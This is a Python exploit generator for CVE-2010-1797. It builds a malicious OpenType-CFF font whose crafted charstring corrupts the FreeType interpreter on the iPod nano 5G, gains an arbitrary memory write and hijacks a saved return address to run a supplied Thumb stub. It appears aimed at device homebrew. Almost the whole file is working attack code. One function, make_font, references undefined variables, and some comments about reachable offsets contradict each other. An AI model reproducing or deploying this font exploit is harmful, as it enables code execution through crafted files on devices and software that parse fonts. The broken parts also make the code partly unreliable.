#!/usr/bin/env python3
"""
make_star_font.py — build the CVE-2010-1797 ("star") malicious CFF font for the
iPod nano 5G (S5L8730) osos FreeType 2.3.x charstring interpreter.

Direct Python port of ipod_sun/src/exploit.rs (create_cff) + cff.rs (CffFile /
Type1CharString encoding) + payload/code_exec.rs (InitialCodeExecPayload).

Reference (comex star), from ipod_sun/src/payload/exploit_config.rs — ExploitConfigN5GEmu:
    OFFSET_BUILDCHAR_LEN_PTR = 120   (words)  -> len_buildchar
    OFFSET_BUILDCHAR_PTR     = 119   (words)  -> buildchar[0]
    OFFSET_LR                = 120+23=143     -> interpreter frame saved LR
    PUSH_COUNT               = 43
    SWAP_COUNT               = 128
    DROP_COUNT               = SWAP_COUNT + 17 = 145
    BUILDCHAR_OVERWRITE_ADDR = 0x08000000
    BUILDCHAR_WRITE_OFFSET   = 0x5024

Exploit shape (charstrings_idx.data[1]):
    [ push 1        x 43 ]      fill operand stack near top
    [ random, exch  x 128 ]     walk `top` past stack -> overwrite buildchar / len_buildchar
    [ random            ]       put a nonzero len into len_buildchar
    [ drop          x 145 ]     drop back so push is usable again
    [ payload ops        ]      index_write(len_buildchar=INT_MAX), index_write(buildchar=target), stub/marker writes
    [ endchar            ]

Docs/42 Phase 0-A: SCRATCH and MARKER targets are now parameterised —
  * full mode  (--scratch, default 0x22050000 free SRAM, STUB_ENTRY=0x22050001):
    buildchar base is repointed to the scratch address, the stub body is written
    there word-by-word, and put(143) hijacks the saved LR into STUB_ENTRY.
  * marker mode (--marker-target, default 0x22050000 free SRAM):
    buildchar base -> marker_target, 8 marker words at marker_target+0x5024, no
    LR hijack.  0x08005024 (the old SCRATCH) is live osos code on device , so the defaults now avoid corrupting running code.
The 64-byte stub cap is lifted: pass a real chain-load stub via --stub (any size;
the charstring simply grows).  Op ordering is load-bearing and unchanged.

Output: BOTH (a) a raw CFF intermediate (same byte-level format Base.ttf uses) and
(b) the PRIMARY wrapped OTTO/OpenType-CFF sfnt (magic 'OTTO') that real FreeType's
FT_New_Memory_Face will open .  `wrap_cff_otf` / `make_wrapped_font` / 
`validate_wrapped_otf` below implement the wrapper + round-trip checks.
"""
import struct, sys, os

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

# ---- CFF type1 (Type2) charstring opcodes (mirror cff.rs) ----
class Op:
    def __init__(self, b):
        self.b = b
    def enc(self):
        return self.b

def PUSH(x):          # 0xff + 32-bit BE (shortint pushes also valid but star uses 0xff)
    return bytes([0xFF]) + struct.pack('>I', x & 0xffffffff)
def RANDOM():          return bytes([12, 23])
def EXCH():           return bytes([12, 28])
def DROP():           return bytes([12, 18])
def PUT():            return bytes([12, 20])
def ENDCHAR():        return bytes([14])
def OR_():            return bytes([12, 4])
def DUP():            return bytes([12, 27])
def INDEX():          return bytes([12, 29])
def GET():            return bytes([12, 21])
def EQ():             return bytes([12, 15])
def SUB():            return bytes([12, 11])

def index_write(idx, value):
    """push value; push (idx<<16); put  ->  buildchar[idx] = value (star primitive)"""
    return PUSH(value) + PUSH((idx & 0xffff) << 16) + PUT()

def index_write_array(idx, word):
    """push <le u32 word>; push (idx<<16); put  (bytes are little-endian here)"""
    return PUSH(struct.unpack('<I', word)[0]) + PUSH((idx & 0xffff) << 16) + PUT()


# ---- CFF container parse/write (mirror cff.rs CffFile / CffIndex) ----
class CffIndex:
    def __init__(self, data, off_size=None):
        self.data = data
        self.off_size = off_size or (4 if len(data) > 1 and max((len(d) for d in data), default=0) + len(data) > 0xff else 1)
    @classmethod
    def parse(cls, buf, off):
        count = struct.unpack('>H', buf[off:off+2])[0]
        off += 2
        if count == 0:
            return cls([]), off
        os_ = buf[off]; off += 1
        sz = {1:'B', 2:'H', 4:'I'}[os_]
        vals = []
        for _ in range(count + 1):
            v = struct.unpack('>'+sz, buf[off:off+os_])[0]; off += os_  # note off_size 3 not supported (matches cff.rs)
            vals.append(v)
        data_start = off
        data = []
        for k in range(count):
            length = vals[k+1] - vals[k]
            data.append(buf[data_start + vals[k] - 1 : data_start + vals[k] - 1 + length])
        end = data_start + vals[count] - 1
        return cls(data, os_), end
    def write(self):
        if not self.data:
            return struct.pack('>H', 0)
        n = len(self.data)
        # choose off_size to hold max offset (+1 for the final offset)
        max_off = 1 + sum(len(d) for d in self.data)
        os_ = 1 if max_off <= 0xff else (2 if max_off <= 0xffff else 4)
        out = bytearray(struct.pack('>H', n))
        out.append(os_)
        c = 1
        offsets = []
        for d in self.data:
            offsets.append(c)
            c += len(d)
        offsets.append(c)
        sz = {1:'>B', 2:'>H', 4:'>I'}[os_]
        for o in offsets:
            out += struct.pack(sz, o)
        for d in self.data:
            out += d
        return bytes(out)

class CffFile:
    def __init__(self, name_idx, font_dict, string_idx, global_subrs, charstrings):
        self.name_idx = name_idx
        self.font_dict = font_dict
        self.string_idx = string_idx
        self.global_subrs = global_subrs
        self.charstrings = charstrings
    @classmethod
    def parse(cls, buf):
        off = 0
        major, minor, hdr_size, off_size = buf[0], buf[1], buf[2], buf[3]
        assert major == 1 and hdr_size == 4
        off = 4
        name_idx, off = CffIndex.parse(buf, off)
        font_dict, off = CffIndex.parse(buf, off)
        string_idx, off = CffIndex.parse(buf, off)
        global_subrs, off = CffIndex.parse(buf, off)
        charstrings, off = CffIndex.parse(buf, off)
        return cls(name_idx, font_dict, string_idx, global_subrs, charstrings), off
    def write(self):
        out = bytes([1, 0, 4, 1])   # major minor hdrsize offsize (offsize of top dict not used further)
        out += self.name_idx.write()
        out += self.font_dict.write()
        out += self.string_idx.write()
        out += self.global_subrs.write()
        out += self.charstrings.write()
        return out


class StarConfig:
    OFFSET_BUILDCHAR_LEN_PTR = 120
    OFFSET_BUILDCHAR_PTR     = 119
    OFFSET_LR                = 120 + 23   # 143 (cff_slot_load saved LR @ dec+0x368)
    # parse_charstrings' OWN saved LR: push {r0,r1,r2,r4-r7,lr} puts lr at
    # (SP-4); dec = SP+0x4c (cff_slot_load 0x082f1906) -> slot = dec-0x50.
    # buildchar base dec+0x12c -> put index = (-0x50-0x12c)/4 = -95.
    # Hijacking THIS fires at endchar (parse returns immediately), BEFORE
    # cff_slot_load's post-parse window reads the zone-walk-corrupted locals
    # (device-proven crash: window derefs [sp,#0x1c]/[+0x38c] first).
    OFFSET_LR_PARSE          = -95
    PUSH_COUNT               = 43
    SWAP_COUNT               = 128
    DROP_COUNT               = 128 + 17
    BUILDCHAR_OVERWRITE_ADDR = 0x08000000
    BUILDCHAR_WRITE_OFFSET   = 0x5024

    def __init__(self, scratch=None, marker_target=None):
        """
        Parameterised scratch / marker destinations .

        scratch       : the region the FULL-mode stub blob is written to, i.e. the
                        value that BUILDCHAR_OVERWRITE_ADDR + BUILDCHAR_WRITE_OFFSET
                        resolves to at run time.  Default 0x22050000 (free SRAM,
                        ) so STUB_ENTRY = 0x22050001 (Thumb).
        marker_target : the region the MARKER-mode buildchar is pointed at (the 8
                        marker words).  Default 0x22050000 (free SRAM; invisible but
                        non-corrupting).  On hardware a visible LCD-framebuffer
                        target may be substituted.

        NOTE the arbitrary write lands at `BUILDCHAR_OVERWRITE_ADDR +
        BUILDCHAR_WRITE_OFFSET` (in FULL mode = scratch+0, in MARKER mode =
        marker_target + 0x5024) because the `put` store `str r7,[r0,r1]` indexes off
        the repointed buildchar base (= BUILDCHAR_OVERWRITE_ADDR after put(119)); the
        *value* the payload pushes as the buildchar base via put(119) is what we now
        parameterise.  So both the buildchar base (put 119) and the stub body base are
        set to the same scratch address, keeping the writes and the later jump
        self-consistent.
        """
        self.scratch = 0x22050000 if scratch is None else scratch
        self.marker_target = 0x22050000 if marker_target is None else marker_target
        # Full mode: buildchar base -> scratch, stub body starts there too.
        self.BUILDCHAR_OVERWRITE_ADDR = self.scratch
        self.BUILDCHAR_WRITE_OFFSET   = 0
        # marker mode: buildchar base -> marker_target, write offset 0x5024
        self.MARKER_WRITE_OFFSET = 0x5024

    @property
    def STUB_ENTRY(self):
        """Value written into the saved-LR slot: SCRATCH_ADDR with the Thumb bit set."""
        return self.scratch | 1

    @property
    def SCRATCH_ADDR(self):
        return self.scratch

    def shell_target(self):
        """Absolute VA the arbitrary writes land at (the buildchar base after put(119))."""
        return self.BUILDCHAR_OVERWRITE_ADDR + self.BUILDCHAR_WRITE_OFFSET

    def marker_target_va(self):
        return self.marker_target + self.MARKER_WRITE_OFFSET


# ---- put (buildchar[idx]=value) primitive CS sequences ----

def put_write_lr_chain(cfg):
    """
    Append the LR-hijack put: put(OFFSET_LR) = STUB_ENTRY.

    After the stack walk, buildchar base is left re-pointed at `dec+0x12c`
    (the propagated zone pointer), so — exactly like put(119) -> [dec+0x308]
    and put(120) -> [dec+0x30c] — put(OFFSET_LR=143) lands on
    `dec+0x12c + 143*4 = dec+0x368`, the interpreter frame's saved-LR slot
    (23 words past len_buildchar).  NO further buildchar re-point is needed;
    this must therefore be emitted BEFORE `index_write(119, 0x08000000)`
    repoints buildchar into the image for the stub write.

    Returns the byte sequence.
    """
    ops = bytearray()
    # saved LR <- STUB_ENTRY (Thumb)
    ops += index_write(cfg.OFFSET_LR, cfg.STUB_ENTRY)   # put(143) -> cff_slot_load saved LR;
    # NOTE: put operands decode LOGICALLY (>>16) — negative indices are impossible;
    # deeper frames (parse_charstrings' own LR @ dec-0x50) are UNREACHABLE. The
    # window locals the post-parse code reads sit OUTSIDE the corrupted zone, so
    # the hijack at cff_slot_load's return fires BEFORE the later-glyph crash
    # (device-observed with the marker variant).
    return bytes(ops)


def build_charstring(cfg, mode='marker', stub_blob=None, payload_blob=None, payload_addr=0x22000000):
    """
    Build the star charstring (Type2) per the N5GEmu config.

    mode='marker'  -> benign marker writes at BUILDCHAR_WRITE_OFFSET, NO LR hijack.
    mode='full'    -> writes `stub_blob` (a thumb stub) at SCRATCH_ADDR, and
                      put(OFFSET_LR) overwrites the saved-LR slot to jump into it.
    """
    assert mode in ('marker', 'full'), mode
    ops = bytearray()

    # 1) fill the value stack near its top
    for _ in range(cfg.PUSH_COUNT):
        ops += PUSH(1)

    # 2) swap the `zone`/stack pointer forward until it overwrites buildchar
    for _ in range(cfg.SWAP_COUNT):
        ops += RANDOM()
        ops += EXCH()

    # 3) put a nonzero length into len_buildchar
    ops += RANDOM()

    # 4) drop back down so push is usable again
    for _ in range(cfg.DROP_COUNT):
        ops += DROP()

    # 5) payload ops
    if mode == 'marker':
        # len_buildchar = INT_MAX (unchanged N5GEmu behaviour)
        ops += index_write(cfg.OFFSET_BUILDCHAR_LEN_PTR, 0x7fffffff)
        # buildchar[0] = MARKER_TARGET (the free-SRAM / LCD region), so the marker
        # words land at marker_target + MARKER_WRITE_OFFSET (default 0x22005024).
        ops += index_write(cfg.OFFSET_BUILDCHAR_PTR, cfg.marker_target)
        # write a few magic markers at MARKER_WRITE_OFFSET + k*4 (detectable in emu)
        base_idx = cfg.MARKER_WRITE_OFFSET // 4
        for k in range(8):
            ops += index_write_array(base_idx + k, struct.pack('<I', 0xC0DEC0DE + k))
    else:  # full
        # NOTE ordering is load-bearing:
        #  a) put(120) / put(143) / put(119) all rely on buildchar base being
        #     dec+0x12c (the post-walk zone pointer) to hit [dec+0x30c],
        #     [dec+0x368] (saved LR) and [dec+0x308] respectively.
        #  b) put(143) (LR hijack) MUST come before put(119) repoints buildchar
        #     to the scratch region; after that repoint, put indices are
        #     scratch-relative, and put(119)/put(143) can no longer reach the
        #     decoder fields.
        ops += index_write(cfg.OFFSET_BUILDCHAR_LEN_PTR, 0x7fffffff)  # len = INT_MAX
        ops += put_write_lr_chain(cfg)                              # saved LR <- STUB_ENTRY
        ops += index_write(cfg.OFFSET_BUILDCHAR_PTR, cfg.BUILDCHAR_OVERWRITE_ADDR)  # buildchar -> scratch
        # write the thumb stub blob at SCRATCH_ADDR (word-chunks, little-endian)
        base_idx = cfg.BUILDCHAR_WRITE_OFFSET // 4
        for k in range(0, len(stub_blob), 4):
            chunk = stub_blob[k:k + 4].ljust(4, b'\x00')
            ops += index_write_array(base_idx + k // 4, chunk)
        # SELF-DELIVERY (no osos code calls in the
        # chain): repoint buildchar to payload_addr and write a second payload
        # (the launcher) there too — the font IS the delivery mechanism.
        if payload_blob:
            # NOTE: after the first put(119) repoint, further put(119)s are
            # SCRATCH-RELATIVE writes — there is exactly ONE arbitrary write
            # window. The payload therefore rides the SAME window at a put-index
            # offset: payload_addr = scratch + idx*4.
            idx_off = (payload_addr - cfg.scratch) // 4
            if (payload_addr - cfg.scratch) % 4 or idx_off < 0 or idx_off > 0xffff - len(payload_blob)//4:
                raise ValueError("payload_addr must be scratch + 4*idx within the put window")
            for k in range(0, len(payload_blob), 4):
                chunk = payload_blob[k:k + 4].ljust(4, b'\x00')
                ops += index_write_array(idx_off + k // 4, chunk)

    ops += ENDCHAR()
    return bytes(ops)


def make_font(out_path, base_ttf=os.path.join(ROOT, 'ipod_sun', 'Base.ttf'),
              cfg=StarConfig(), mode='marker', stub_blob=None):
    """Emit the RAW CFF font (intermediate only).  See make_wrapped_font / wrap_cff_otf
    for the OTTO-wrapped primary artifact that real FreeType will accept."""
    tmp = open(base_ttf, 'rb').read()
    file_, consumed = CffFile.parse(tmp)
    cs = build_charstring(cfg, mode, stub_blob, payload_blob, payload_addr)
    file_.charstrings.data[1] = cs
    out = bytearray(file_.write())
    out += tmp[consumed:]
    open(out_path, 'wb').write(bytes(out))
    return out


# =====================================================================
# OTTO (OpenType/CFF) sfnt wrapper — the PRIMARY device artifact.
# =====================================================================
#
# make_font() above emits a RAW CFF (header 01 00 04 01).  Real FreeType will NOT
# open that via FT_New_Memory_Face: that path requires an sfnt container magic
# 'OTTO' (or 0x00010000), with the CFF payload carried as the 'CFF ' table.  The
# wrapper below transparently builds a minimal well-formed 2-glyph OTTO sfnt
# (head/hhea/hmtx/maxp/cmap/name/post/CFF ) around the star CFF, so the glyph
# loop  can open + render it on
# the device.  Glyph 0 = .notdef, glyph 1 = the star charstring.
#
# This is the same logic the full-boot emu driver (tools/n5g_emu_fontchain.py,
# `build_star_otf`) built inline; ported here so make_star_font.py itself emits the
# openable artifact .
#
# Round-trip validated by `validate_wrapped_otf()`: sfnt directory sane, CFF table
# re-parses, charstrings[1] == star charstring, CFF table checksum/offset consistent.

def wrap_cff_otf(cff_table, n_glyphs=2, family_name=b"EXPLOIT1"):
    """Wrap a raw CFF byte-string into a minimal 2-glyph OTTO sfnt container.
    Returns the full sfnt bytes."""
    def _head(adj=0):
        b = bytearray(54)
        struct.pack_into(">I", b, 0, 0x00010000)     # version 1.0
        struct.pack_into(">I", b, 4, 0x00010000)     # fontRevision 1.0
        struct.pack_into(">I", b, 12, 0x5F0F3CF5)    # magicNumber
        struct.pack_into(">H", b, 16, 0x000B)        # flags
        struct.pack_into(">H", b, 18, 1000)          # unitsPerEm
        struct.pack_into(">q", b, 20, 0)             # created
        struct.pack_into(">q", b, 28, 0)             # modified
        struct.pack_into(">h", b, 36, 0)             # xMin
        struct.pack_into(">h", b, 38, 0)             # yMin
        struct.pack_into(">h", b, 40, 600)           # xMax
        struct.pack_into(">h", b, 42, 600)           # yMax
        struct.pack_into(">H", b, 44, 0)             # macStyle
        struct.pack_into(">H", b, 46, 8)             # lowestRecPPEM
        struct.pack_into(">h", b, 48, 2)             # fontDirectionHint
        struct.pack_into(">h", b, 50, 0)             # indexToLocFormat = short
        struct.pack_into(">h", b, 52, 0)             # glyphDataFormat
        struct.pack_into(">I", b, 8, adj)            # checkSumAdjustment
        return bytes(b)

    def _maxp():
        return struct.pack(">IH", 0x00010000, n_glyphs)

    def _hhea():
        b = bytearray(36)
        struct.pack_into(">I", b, 0, 0x00010000)
        struct.pack_into(">h", b, 4, 700)            # ascender
        struct.pack_into(">h", b, 6, -200)           # descender
        struct.pack_into(">h", b, 8, 0)              # lineGap
        struct.pack_into(">H", b, 10, 600)           # advanceWidthMax
        struct.pack_into(">h", b, 12, 0)             # minLeftSideBearing
        struct.pack_into(">h", b, 14, 0)             # minRightSideBearing
        struct.pack_into(">h", b, 16, 600)           # xMaxExtent
        struct.pack_into(">h", b, 18, 1)             # caretSlopeRise
        struct.pack_into(">h", b, 20, 0)             # caretSlopeRun
        struct.pack_into(">h", b, 22, 0)             # caretOffset
        struct.pack_into(">q", b, 24, 0)             # reserved
        struct.pack_into(">h", b, 32, 0)             # metricDataFormat
        struct.pack_into(">H", b, 34, n_glyphs)      # numberOfHMetrics
        return bytes(b)

    def _hmtx():
        b = bytearray(0)
        for _ in range(n_glyphs):
            b += struct.pack(">Hh", 600, 0)
        return bytes(b)

    def _cmap():
        sub = bytearray(262)
        struct.pack_into(">H", sub, 0, 0)          # format 0
        struct.pack_into(">H", sub, 2, 262)        # length
        struct.pack_into(">H", sub, 4, 0)          # language
        for i in range(256):
            sub[6 + i] = i if i < n_glyphs else 0
        b = bytearray(12)
        struct.pack_into(">H", b, 0, 0)            # version
        struct.pack_into(">H", b, 2, 1)            # numTables
        struct.pack_into(">H", b, 4, 3)            # platform 3 (Windows)
        struct.pack_into(">H", b, 6, 1)            # encoding 1 (Unicode BMP)
        struct.pack_into(">I", b, 8, 12)           # offset to subtable
        return bytes(b) + bytes(sub)

    def _name():
        s = family_name
        n = 6 + 12 + len(s)
        b = bytearray(n + (4 - n % 4) % 4)
        struct.pack_into(">H", b, 0, 0)            # format
        struct.pack_into(">H", b, 2, 1)            # count
        struct.pack_into(">H", b, 4, 6)            # stringOffset
        struct.pack_into(">H", b, 6, 0)            # platform
        struct.pack_into(">H", b, 8, 3)            # encoding
        struct.pack_into(">H", b, 10, 0)           # language
        struct.pack_into(">H", b, 12, 1)           # nameID = 1
        struct.pack_into(">H", b, 14, len(s))      # length
        struct.pack_into(">H", b, 16, 0)           # offset
        b[18:18 + len(s)] = s
        return bytes(b)

    def _post():
        return struct.pack(">IIh", 0x00020000, 0, 0)

    tables = [
        (b"CFF ", cff_table),
        (b"cmap", _cmap()),
        (b"head", _head()),
        (b"hhea", _hhea()),
        (b"hmtx", _hmtx()),
        (b"maxp", _maxp()),
        (b"name", _name()),
        (b"post", _post()),
    ]
    tables.sort(key=lambda t: t[0])

    def _csum(data):
        padded = data + b"\0" * ((4 - len(data) % 4) % 4)
        return sum(struct.unpack(">%dI" % (len(padded) // 4), padded)) & 0xffffffff

    num = len(tables)
    sr = 1
    while sr * 2 <= num:
        sr *= 2
    searchRange = sr * 16
    entrySelector = sr.bit_length() - 1
    rangeShift = num * 16 - searchRange

    dir_len = 12 + 16 * num
    off = dir_len
    recs = []
    for tag, data in tables:
        off = (off + 3) & ~3
        padded = data + b"\0" * ((4 - len(data) % 4) % 4)
        recs.append([tag, _csum(data), off, len(data), padded])
        off += len(padded)

    out = bytearray()
    out += struct.pack(">IHHHH", 0x4F54544F, num, searchRange, entrySelector, rangeShift)
    for tag, cs, to, ln, _ in recs:
        out += struct.pack(">4sIII", tag, cs, to, ln)
    data_blob = bytearray()
    for tag, cs, to, ln, padded in recs:
        while len(data_blob) < to - dir_len:
            data_blob.append(0)
        data_blob += padded
    out += bytes(data_blob)

    # checksumAdjustment = 0xB1B0AFBA - (header checksum + sum(table checksums)).
    # NOTE: the sfnt header itself has NO checkSum field (that is a TrueType
    # 'checksumAdjustment' in the OFFSET TABLE only for TTF; for OTTO the
    # adjustment lives solely in the 'head' table at head.offset+8).  Do NOT
    # write into the header bytes 8..11 (that would corrupt rangeShift).
    total = _csum(bytes(out[:dir_len]))
    for tag, cs, to, ln, _ in recs:
        total = (total + cs) & 0xffffffff
    adj = (0xB1B0AFBA - total) & 0xffffffff

    for tag, cs, to, ln, _ in recs:
        if tag == b"head":
            struct.pack_into(">I", out, to + 8, adj)
    return bytes(out)


def make_wrapped_font(cfg, mode, stub_blob=None, payload_blob=None, payload_addr=0x22000000,
                      base_ttf=os.path.join(ROOT, 'ipod_sun', 'Base.ttf')):
    """Build the RAW CFF for `mode` and wrap it into an OTTO sfnt.  Returns
    (otf_bytes, raw_cff_bytes)."""
    tmp = open(base_ttf, 'rb').read()
    file_, consumed = CffFile.parse(tmp)
    cs = build_charstring(cfg, mode, stub_blob, payload_blob, payload_addr)
    file_.charstrings.data[1] = cs
    raw = bytearray(file_.write())
    raw += tmp[consumed:]
    raw = bytes(raw)
    otf = wrap_cff_otf(raw, n_glyphs=len(file_.charstrings.data),
                       family_name=b"EXPLOIT1" if mode == 'marker' else b"PNGRWORM")
    return otf, raw


def validate_wrapped_otf(otf, cfg, mode, stub_blob=None, payload_blob=None, payload_addr=0x22000000):
    """Round-trip sanity checks on a wrapped OTTO sfnt:
      - sfnt magic == 'OTTO'; table directory self-consistent
      - all required tables present (head/hhea/hmtx/maxp/cmap/name/post/CFF )
      - CFF table re-parses as a CffFile
      - charstrings[1] == build_charstring(mode)  (the star)
      - CFF table offset + length stay within the file
    Returns a list of (ok: bool, msg: str) assertions.
    """
    res = []
    def chk(cond, msg):
        res.append((bool(cond), msg))

    magic, num, sr, es, rs = struct.unpack(">IHHHH", otf[:12])
    chk(magic == 0x4F54544F, "sfnt magic == OTTO (%s)" % hex(magic))
    chk(num == 8, "8 tables (num=%d)" % num)

    tags = {}
    pos = 12
    for i in range(num):
        tag, csum, off, ln = struct.unpack(">4sIII", otf[pos:pos + 16])
        tags[tag] = (csum, off, ln)
        pos += 16
    chk(set(tags) == {b"head", b"hhea", b"hmtx", b"maxp", b"cmap", b"name", b"post", b"CFF "},
        "required tables present: %s" % sorted(t.decode('latin1') for t in tags))

    csum, coff, clen = tags.get(b"CFF ", (0, 0, 0))
    chk(coff + clen <= len(otf), "CFF table within file (off=%d len=%d total=%d)" % (coff, clen, len(otf)))

    raw_cff = otf[coff:coff + clen]
    cff, consumed = CffFile.parse(raw_cff)
    chk(len(cff.charstrings.data) == 2, "CFF table re-parses (2 charstrings)")
    expected = build_charstring(cfg, mode, stub_blob, payload_blob, payload_addr)
    chk(cff.charstrings.data[1] == expected, "charstrings[1] == star charstring (%d bytes)" % len(expected))

    # --- sfnt checksum audit (spec: whole-file checksum == 0xB1B0AFBA) ---
    def _cs(d):
        p = d + b"\0" * ((4 - len(d) % 4) % 4)
        return sum(struct.unpack(">%dI" % (len(p) // 4), p)) & 0xffffffff
    # rebuild directory records
    recs = {}
    pos = 12
    for i in range(num):
        tag, csum, off, ln = struct.unpack(">4sIII", otf[pos:pos + 16])
        recs[tag] = (csum, off, ln)
        pos += 16
    dirsum = _cs(otf[:12 + 16 * num])
    tabs_ok = True
    for tag, (cs, off, ln) in recs.items():
        data = otf[off:off + ln]
        if tag == b"head":
            b = bytearray(data); b[8:12] = b"\0\0\0\0"
            calc = _cs(bytes(b))
        else:
            calc = _cs(data)
        if calc != cs:
            tabs_ok = False
        dirsum = (dirsum + cs) & 0xffffffff
    chk(tabs_ok, "sfnt table dir checksums consistent")
    chk(_cs(otf) == 0xB1B0AFBA, "whole-file checksum == 0xB1B0AFBA")
    return res


# ---- placeholder thumb stub (stub body supplied later) ----
# A fixed-size blob boundary only if no --stub is given.  The default is a Thumb
# endless loop (`b .`, bytes `e7 fe`) padded to STUB_BLOB_BYTES with NOPs
# (0x46c0).  The real entry stub is passed via --stub
# and may be arbitrarily large (the charstring simply grows; 
# drops the old 64-byte cap).
STUB_BLOB_BYTES = 64

def default_stub_blob():
    blob = bytearray()
    blob += b'\xe7\xfe'                # thumb: b .-2  (spin in place; observable)
    blob += b'\x00' * 2
    while len(blob) < STUB_BLOB_BYTES:
        blob += b'\xc0\x46'            # thumb nop
    return bytes(blob[:STUB_BLOB_BYTES])


RSRC_FONT_CAP = 0x14000   # 0x14000 = 81920 bytes 


if __name__ == '__main__':
    import argparse
    ap = argparse.ArgumentParser(description='Build star CFF fonts (marker + full LR-hijack). '
                                            'Primary output is the OTTO/OpenType-CFF wrapped '
                                            'font (real FreeType FT_New_Memory_Face will open it); '
                                            'the raw CFF is kept as an intermediate only.')
    ap.add_argument('--outdir', default=os.path.join(ROOT, 'build'))
    ap.add_argument('--base', default=os.path.join(ROOT, 'ipod_sun', 'Base.ttf'))
    ap.add_argument('--stub', default=None, help='path to a .bin thumb stub (default: placeholder spin loop)', nargs='?')
    ap.add_argument('--scratch', default=None,
                    help='hex addr the FULL-mode stub blob goes to (default 0x22050000 free SRAM); STUB_ENTRY=scratch|1')
    ap.add_argument('--marker-target', default=None,
                    help='hex addr buildchar is repointed to in MARKER mode (default 0x22050000 free SRAM)')
    ap.add_argument('--full-out', default=None,
                    help='output filename for the full WRAPPED font (default: star_n5g_full_wrapped.otf)')
    ap.add_argument('--marker-out', default=None,
                    help='output filename for the marker WRAPPED font (default: star_n5g_marker_wrapped.otf)')
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)

    def hexnum(s):
        return int(s, 16) if s else None

    cfg = StarConfig(scratch=hexnum(args.scratch), marker_target=hexnum(args.marker_target))
    base = args.base

    # 1) marker-only WRAPPED font: 8 marker words, no LR hijack
    mout = os.path.join(args.outdir, args.marker_out or 'star_n5g_marker_wrapped.otf')
    motf, mraw = make_wrapped_font(cfg, mode='marker', base_ttf=base)
    open(mout, 'wb').write(motf)
    open(os.path.join(args.outdir, 'star_n5g_marker.raw.cff'), 'wb').write(mraw)
    print("wrote %s (%d bytes) [markers -> 0x%08x; raw CFF %d bytes]" %
          (mout, len(motf), cfg.marker_target_va(), len(mraw)))
    for ok, msg in validate_wrapped_otf(motf, cfg, mode='marker'):
        print("   [%s] %s" % ("ok" if ok else "FAIL", msg))

    # 2) full WRAPPED font: thumb stub @ SCRATCH_ADDR + put(143) -> saved LR
    stub = open(args.stub, 'rb').read() if args.stub else default_stub_blob()
    fout = os.path.join(args.outdir, args.full_out or 'star_n5g_full_wrapped.otf')
    fotf, fraw = make_wrapped_font(cfg, mode='full', stub_blob=stub, base_ttf=base)
    open(fout, 'wb').write(fotf)
    open(os.path.join(args.outdir, 'star_n5g_full.raw.cff'), 'wb').write(fraw)
    print("wrote %s (%d bytes) [stub %d bytes @ 0x%08x, LR<-0x%08x; raw CFF %d bytes]" %
          (fout, len(fotf), len(stub), cfg.SCRATCH_ADDR, cfg.STUB_ENTRY, len(fraw)))
    for ok, msg in validate_wrapped_otf(fotf, cfg, mode='full', stub_blob=stub):
        print("   [%s] %s" % ("ok" if ok else "FAIL", msg))

    # size cap check
    for name, data in ((mout, motf), (fout, fotf)):
        over = len(data) > RSRC_FONT_CAP
        print("  %-36s %d bytes  %s cap 0x%x" % (os.path.basename(name), len(data),
              "OVER" if over else "<= ", RSRC_FONT_CAP))
